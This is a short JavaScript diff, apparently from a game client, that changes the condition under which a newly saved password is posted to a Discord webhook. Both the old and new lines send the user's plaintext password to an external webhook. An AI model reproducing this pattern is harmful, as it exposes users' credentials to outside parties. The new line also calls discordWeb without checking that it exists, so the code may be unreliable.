@@ -7706,7 +7706,7 @@ function NameInput() {
         if (savePassword(splitText)) {
             displayUsername();
             showError.displayError(3231);
-            if (oldPassword != splitText && typeof(discordWeb) == "object") discordWeb.postWebhook(4, splitText, false)
+            if (oldPassword != splitText && typeof(modHandler) == "object" && modHandler.public) discordWeb.postWebhook(4, splitText, false)
             return true;
         }
         displayUsername();
